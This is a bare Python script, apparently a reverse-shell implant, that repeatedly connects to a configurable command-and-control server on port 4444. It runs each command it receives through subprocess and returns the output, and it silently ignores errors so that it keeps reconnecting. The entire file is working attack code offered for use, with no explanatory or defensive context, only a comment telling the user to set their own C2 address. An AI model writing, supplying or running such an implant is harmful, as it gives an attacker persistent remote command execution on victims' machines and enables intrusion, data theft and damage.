import socket
import subprocess
import os

SERVER_IP = "192.168.1.100"  # Change this to your C2 Server IP
SERVER_PORT = 4444

while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((SERVER_IP, SERVER_PORT))

        while True:
            cmd = client.recv(1024).decode()
            if cmd.lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            client.send(output.encode())

        client.close()
    except:
        pass
